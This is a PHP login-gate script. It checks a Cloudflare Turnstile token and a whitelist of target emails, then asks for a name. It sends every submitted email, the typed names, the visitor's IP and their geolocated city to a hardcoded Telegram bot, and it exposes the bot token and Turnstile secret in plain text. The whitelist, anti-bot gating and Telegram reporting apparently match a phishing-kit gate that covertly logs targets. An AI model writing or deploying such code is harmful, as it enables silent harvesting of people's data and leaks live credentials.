<?php
session_start();
define("ATTEMPTS_FILE", __DIR__ . "/attempts.json");
define("WHITELIST_FILE", __DIR__ . "/papa.txt");

// Telegram config
$telegram_bot = "7657571386:AAHH3XWbHBENZBzBul6cfevzAoIiftu-TVQ";
$telegram_chat = "6915371044";

// Turnstile secret
$turnstile_secret = "0x4AAAAAACEAdSoSffFlw4Y93xBl0UFbgsc";

// Real IP detection (Cloudflare + fallback)
$ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';

// Load attempts
if(!file_exists(ATTEMPTS_FILE)) file_put_contents(ATTEMPTS_FILE,"{}");
$attempts = json_decode(file_get_contents(ATTEMPTS_FILE), true);
if(!is_array($attempts)) $attempts = [];

// STEP 1: Email submission
if(isset($_POST['email'])){
    $email = strtolower(trim($_POST['email']));
    $token = $_POST['cf-turnstile-response'] ?? '';

    // --- Turnstile verification ---
    $curl = curl_init("https://challenges.cloudflare.com/turnstile/v0/siteverify");
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query([
        "secret" => $turnstile_secret,
        "response" => $token,
        "remoteip" => $ip
    ]));
    $resp = json_decode(curl_exec($curl), true);
    curl_close($curl);
    if(empty($resp['success'])){
        $_SESSION['error_message'] = "Turnstile validation failed";
        header("Location: index.php");
        exit;
    }

    // --- Email whitelist ---
    $whitelist = array_map('trim', file(WHITELIST_FILE));
    if(!in_array($email, $whitelist)){
        $_SESSION['error_message'] = "Email not in whitelist";
        header("Location: index.php");
        exit;
    }

    // Store validated email & move to step 2
    $_SESSION['old_email'] = $email;
    $_SESSION['step'] = 2;
    header("Location: index.php");
    exit;
}

// STEP 2: Name submission
if(isset($_POST['name'])){
    $email = $_SESSION['old_email'] ?? '';
    $name = trim($_POST['name'] ?? '');
    if(!$email){
        $_SESSION['error_message'] = "Session expired, start over";
        $_SESSION['step'] = 1;
        header("Location: index.php");
        exit;
    }

    // Initialize attempts
    if(!isset($attempts[$email])){
        $attempts[$email] = ['count'=>0,'names'=>[],'ips'=>[]];
    }
    $attempts[$email]['count']++;
    $attempts[$email]['names'][] = $name;
    $attempts[$email]['ips'][] = $ip;

    // Geo lookup
    $geo = @json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
    $loc = ($geo['city'] ?? 'Unknown').', '.($geo['country'] ?? 'Unknown');

    // Telegram notification
    $msg = "Login attempts for $email:\nNames: ".implode(", ", $attempts[$email]['names'])."\n";
    $msg .= "Attempts: ".$attempts[$email]['count']."\nIP: $ip\nLocation: $loc";
    @file_get_contents("https://api.telegram.org/bot$telegram_bot/sendMessage?chat_id=$telegram_chat&text=".urlencode($msg));

    file_put_contents(ATTEMPTS_FILE,json_encode($attempts,JSON_PRETTY_PRINT));

    // Check correct name
    $correct_name = "John Doe";
    if($name !== $correct_name){
        $_SESSION['error_message'] = "Incorrect name";
        header("Location: index.php");
        exit;
    }

    // Success
    unset($_SESSION['step']);
    unset($_SESSION['old_email']);
    header("Location: dashboard.php");
    exit;
}
